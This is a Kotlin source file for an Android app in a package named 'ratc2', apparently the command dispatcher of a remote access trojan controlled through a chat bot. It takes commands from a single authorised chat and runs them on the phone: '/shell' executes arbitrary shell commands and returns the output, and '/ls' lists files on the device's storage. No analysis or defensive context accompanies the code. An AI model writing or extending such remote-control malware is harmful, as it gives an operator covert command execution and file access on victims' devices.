package com.spud.ratc2

import android.content.Context

class CommandDispatcher(private val ctx: Context) {

    fun dispatch(chatId: String, cmd: String): String {
        if (chatId != Config.AUTHORIZED_CHAT_ID) return ""
        val parts = cmd.trim().split(" ", limit = 2)
        val arg = parts.getOrElse(1) { "" }
        return try {
            when (parts[0].lowercase()) {
                "/ping"   -> "pong | ${android.os.Build.MODEL}"
                "/shell"  -> shell(arg)
                "/ls"     -> ls(arg.ifBlank { "/sdcard" })
                "/help"   -> helpText()
                else      -> "unknown: ${parts[0]}"
            }
        } catch (e: Exception) { "err: ${e.message}" }
    }

    private fun shell(cmd: String): String {
        if (cmd.isBlank()) return "usage: /shell <cmd>"
        val p = ProcessBuilder("sh", "-c", cmd)
            .redirectErrorStream(true).start()
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        return out.take(4000).ifBlank { "(no output)" }
    }

    private fun ls(path: String): String {
        val f = java.io.File(path)
        if (!f.exists()) return "no such path"
        return f.listFiles()?.joinToString("\n") {
            (if (it.isDirectory) "[d] " else "[f] ") + it.name
        }?.take(4000) ?: "(empty)"
    }

    private fun helpText() = """
        /ping
        /shell <cmd>
        /ls <path>
    """.trimIndent()
}
